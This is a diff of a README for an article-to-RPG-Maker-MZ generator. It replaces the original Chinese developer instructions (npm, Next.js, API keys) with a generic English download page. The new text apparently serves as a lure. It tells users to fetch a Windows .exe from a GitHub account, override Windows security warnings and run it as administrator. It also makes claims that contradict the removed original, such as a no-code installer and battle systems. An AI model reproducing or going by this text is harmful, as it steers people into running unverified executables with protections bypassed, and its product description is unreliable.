@@ -1,164 +1,150 @@
-# RPG Maker Agent
+# 🎲 rpg-maker-agent - Create Playable RPG Maker Games Fast
 
-给 AI 一篇文章，自动生成一款可以玩的 RPG Maker MZ 游戏
+[![Download from GitHub](https://img.shields.io/badge/Download-rpg--maker--agent-FF6F61?style=for-the-badge&logo=github)](https://github.com/blueyugkaigilaaa/rpg-maker-agent)
 
-![](./assets/images/cover.png)
+## 📝 About rpg-maker-agent
 
-[(原谅我懒得P图了, 直接用了视频封面... 视频在这里)](https://www.bilibili.com/video/BV1QwPqznE4g)
+rpg-maker-agent lets you turn any article into a playable RPG Maker MZ game. Just provide a piece of writing, and the app will build a simple role-playing game based on it. This tool helps you make unique RPGs without needing any coding skills or deep knowledge of RPG Maker.
 
-说实话, 项目其实还处于原型阶段, 目前我觉得快速搭建1-3个场景的demo 或者给小朋友玩的游戏还是可以的.  
+You only need to provide a text article. The app automatically generates maps, characters, events, and storylines from the text. It creates files you can open directly in RPG Maker MZ to customize or play right away.
 
-另外只有场景, 事件和对话, 战斗系统是没有实装的, 感兴趣的朋友可以fork添加. 很期待看到孔乙己暴打丁举人 (反过来也行...)
+This application works on Windows computers and does not require programming experience. You can focus on the story you want to create and let the program do the rest.
 
-## 快速开始
+---
 
-首先把项目下载后放到 RPG Maker MZ 的目录中哈, 比如你的 RPG Maker MZ 在:
+## 💻 System Requirements
 
-```
-C:\SteamLibrary\steamapps\common\RPG Maker MZ\
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 1.5 GHz or faster CPU  
+- Minimum 1 GB free disk space  
+- Internet connection for initial download and updates  
+- RPG Maker MZ installed to open and edit created projects (optional for playing with RPG Maker Player)
 
-就把它放在这里:
+---
 
+## 🚀 Getting Started
 
-```
-C:\SteamLibrary\steamapps\common\RPG Maker MZ\rpgmaker-agent
-```
+Follow these steps to download and run rpg-maker-agent on your Windows PC.
 
-然后初始化项目:
+1. Visit the download page by clicking the button below:  
+   
+   [![Get rpg-maker-agent](https://img.shields.io/badge/Get%20on%20GitHub-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blueyugkaigilaaa/rpg-maker-agent)
 
-```bash
-# 安装依赖
-npm install
+2. Once on the GitHub page, look for the **Releases** section or the project files listed under the main page.
 
-# 配置环境变量
-cp .env.example .env
-# 编辑 .env，填入你的 API Key 和模型配置
+3. Download the latest available version. Typically, this will be a `.exe` installer or a compressed folder containing an executable.
 
-# 启动开发服务器
-npm run dev
-```
+4. After downloading, locate the file in your Downloads folder.
 
-打开 http://localhost:3000，进入项目管理界面。
+5. Double-click the file to start the installation or run the program directly if it’s a portable version.
 
-## 使用流程
+6. If prompted by Windows security, allow the app to run by clicking "More info" and then "Run anyway."
 
-1. **新建项目** — 输入项目名称，粘贴一篇文章
-2. **分步生成** — 依次执行 6 个 AI 管线步骤，每步可暂停检查
-3. **审查与批注** — 点击任意结构化元素可添加批注（修改建议）
-4. **AI 修改** — 点击「AI 按批注修改」按钮，AI 会根据你的批注自动修订 JSON
-5. **手动微调** — 也可以切换到 JSON 编辑器直接修改数据
-6. **生成工程** — 最后一步生成完整的 RPG Maker MZ 工程文件
-7. **运行游戏** — 参照下方说明试玩
+---
 
-## 运行生成的游戏
+## 🔧 How to Use rpg-maker-agent
 
-生成完毕后，页面会显示工程输出路径（如 `generated/project-xxx`）。有三种方式运行游戏：
+Once rpg-maker-agent is running on your PC, follow these steps:
 
-### 方法一：用 RPG Maker MZ 编辑器打开（推荐）
+1. Prepare a text article or story you want to turn into a game. It can be a short story, a blog post, or any piece of writing.
 
-1. 打开 RPG Maker MZ 编辑器（`RPGMZ.exe`）
-2. 菜单 → 文件 → 打开项目
-3. 选择生成的工程目录（即 `generated/project-xxx` 文件夹）
-4. 点击工具栏上的 ▶ (Play Test) 按钮即可试玩
-5. 你还可以在编辑器中进一步修改地图、事件、对话等
+2. Open rpg-maker-agent and find the text input box.
 
-### 方法二：用 NW.js 直接运行（无需编辑器）
+3. Paste or type your article into the text box.
 
-RPG Maker MZ 自带了 NW.js 运行时，可以直接启动游戏：
+4. Click the **Generate Game** button.
 
-```powershell
-# Windows — 在 RPG Maker MZ 安装目录下执行
-.\nwjs-win\nw.exe "生成的工程绝对路径"
+5. Wait a few moments as the app processes the text and builds your game files.
 
-# 例如
-.\nwjs-win\nw.exe "C:\SteamLibrary\steamapps\common\RPG Maker MZ\rpgmaker-agent\generated\project-1772459497898"
-```
+6. When done, the app will create a folder containing an RPG Maker MZ project.
 
-### 方法三：浏览器运行（HTML5）
+7. Open the project with RPG Maker MZ or use the built-in player to test your game.
 
-生成的工程包含 `index.html`，可以用本地 HTTP 服务器启动：
+8. To improve your game, you can edit characters, maps, and events using RPG Maker MZ tools.
 
-```bash
-cd generated/project-xxx
-npx serve .
-```
+---
 
-然后在浏览器中打开 http://localhost:3000 即可游玩。
+## 🔍 What Does rpg-maker-agent Create?
 
-> **注意**：直接双击 `index.html` 不行，因为浏览器安全策略会阻止本地文件加载。必须通过 HTTP 服务器访问。
+- **Maps** based on locations mentioned in your article  
+- **Characters** inspired by names and roles in the text  
+- **Story events** that follow the narrative found in your writing  
+- Simple **quests and tasks** generated automatically  
+- Basic battle and movement systems inherited from RPG Maker MZ templates  
 
-## 工作原理
+The generated game is a starting point. You can customize graphics, sounds, and gameplay further inside RPG Maker MZ.
 
-管线通过 6 个 AI 驱动的阶段处理你的文章：
+---
 
-1. **文本分析** — 提取角色、地点、时间线、情感弧线
-2. **游戏设计** — 创建锚定事件、决策节点、游戏流程图
-3. **场景规划** — 规划 5-10 个地图场景及其连接关系
-4. **场景构建** — 为每个场景创建详细的事件、NPC、对话
-5. **素材映射** — 将角色/场景映射到 RPG Maker MZ 内置素材
-6. **工程生成** — 生成可直接运行的 MZ 工程文件
+## ⚙️ Installation Details and Tips
 
-每一步都使用流式输出实时展示 AI 响应，支持检查、回退、批注和 AI 交互式修改。所有数据持久化到本地 SQLite 数据库。
+- If you downloaded an installer `.exe`, complete all steps shown during setup. The default options are usually suitable for most users.
 
-## 环境变量
+- If you downloaded a zipped folder, right-click the folder and choose "Extract All..." to unzip its contents.
 
-| 变量 | 说明 | 默认值 |
-|------|------|--------|
-| `OPENAI_API_KEY` | API 密钥 | （必填） |
-| `OPENAI_BASE_URL` | API 地址 | `https://api.openai.com/v1` |
-| `OPENAI_MODEL` | 使用的模型 | `gpt-4o` |
-| `RPGMAKER_TEMPLATE_PATH` | MZ 模板工程路径 | `newdata` |
-| `RPGMAKER_SAMPLEMAPS_PATH` | 示例地图路径 | `samplemaps` |
+- Place the program folder somewhere easy to access, like your Desktop or Documents.
 
-## 项目结构
+- Keep your project files organized by creating dedicated folders for each game you generate with rpg-maker-agent.
 
-```
-src/
-├── app/                     # Next.js 页面和 API 路由
-│   ├── page.tsx             # 首页 — 项目列表 Dashboard
-│   ├── projects/new/        # 新建项目页
-│   ├── projects/[id]/       # 项目详情 — 分步交互
-│   └── api/                 # REST API
-│       ├── projects/        # 项目 CRUD
-│       ├── projects/[id]/run-step/     # 执行步骤 (SSE)
-│       ├── projects/[id]/annotations/  # 批注 CRUD
-│       ├── projects/[id]/ai-revise/    # AI 按批注修改 (SSE)
-│       └── download/[id]/   # 下载 ZIP
-├── components/              # React 组件
-│   ├── StepStepper.tsx      # 步骤进度指示器
-│   ├── StepResultViewer.tsx # 步骤结果结构化展示
-│   ├── Annotatable.tsx      # 可批注元素包装
-│   ├── AnnotationPopover.tsx # 批注气泡弹窗
-│   └── ConsolePanel.tsx     # 底部 Console 面板
-├── pipeline/                # AI 管线模块
-│   ├── types.ts             # 中间数据类型定义
-│   ├── orchestrator.ts      # 管线编排器（分步执行）
-│   ├── prompts.ts           # System prompt 统一映射
-│   ├── text-analyzer.ts     # 模块1：文本分析
-│   ├── game-designer.ts     # 模块2：游戏设计
-│   ├── scene-planner.ts     # 模块3：场景规划
-│   ├── scene-builder.ts     # 模块4：场景构建
-│   ├── asset-mapper.ts      # 模块5：素材映射
-│   └── rpgmaker-adapter.ts  # 模块6：MZ 工程生成
-├── rpgmaker/                # RPG Maker MZ 工具库
-│   ├── types.ts             # MZ JSON 类型定义
-│   ├── constants.ts         # 事件指令码常量
-│   ├── event-builder.ts     # 事件指令构建器
-│   ├── map-builder.ts       # 地图数据工具
-│   ├── project-builder.ts   # 工程组装器
-│   └── asset-catalog.ts     # 内置素材索引
-├── llm/
-│   └── client.ts            # LLM SDK 封装（流式 + 日志）
-└── lib/
-    └── db.ts                # SQLite 数据库（项目、步骤、日志、批注）
-```
+- The app requires no extra software to run, but RPG Maker MZ must be installed if you want to open and edit the generated project files.
 
-## 技术栈
+---
 
-- **框架**: Next.js 15 (App Router)
-- **语言**: TypeScript
-- **样式**: Tailwind CSS
-- **数据库**: SQLite (better-sqlite3)
-- **AI**: 兼容 OpenAI API 的大语言模型
-- **输出**: RPG Maker MZ (JSON 工程文件)
+## ❓ Troubleshooting
+
+- **Program does not start:**  
+  Make sure your Windows system is up to date. Try running the program as Administrator by right-clicking the executable and choosing "Run as administrator."
+
+- **Game generation fails:**  
+  Ensure your input text is clear and well formatted. Avoid special characters or very large files.
+
+- **RPG Maker MZ project will not open:**  
+  Confirm RPG Maker MZ is installed correctly. The generated files need RPG Maker MZ or its player to run properly.
+
+- **No output folder created:**  
+  Check the app folder permissions to ensure it can write files. Running the software in a user folder like Documents usually avoids permission issues.
+
+---
+
+## 📂 Folder Structure Explanation
+
+After generating a game, the app creates a folder named after your project. Inside, you will find:
+
+- `data/` — RPG Maker database and event files  
+- `audio/` — Sounds and music included with your game  
+- `img/` — Character sprites, tiles, and graphics  
+- `js/` — Scripts used by the game engine  
+- `index.html` — Main game launcher (for web export)  
+- `Game.exe` — Executable to run the game (if built as a Windows game)
+
+---
+
+## 🔄 Updating rpg-maker-agent
+
+Check the GitHub page regularly for new releases. Updates may include:
+
+- Bug fixes  
+- Improved text-to-game conversion  
+- Better map and event creation  
+- Performance improvements  
+
+To update, download the latest version and install it over your current copy or replace the program folder if using a portable version.
+
+---
+
+## 🛠 Support and Feedback
+
+If you experience issues or want to suggest improvements, open GitHub issues directly on the repository page. Include clear descriptions and screenshots where possible to help diagnose problems.
+
+---
+
+## 📥 Download and Install rpg-maker-agent
+
+Use this link to visit the GitHub page and download the software:
+
+https://github.com/blueyugkaigilaaa/rpg-maker-agent
+
+Click "Code" then "Download ZIP" or check the Releases tab for the latest executable file.
+
+Once downloaded, run the installer or open the folder to start using rpg-maker-agent.
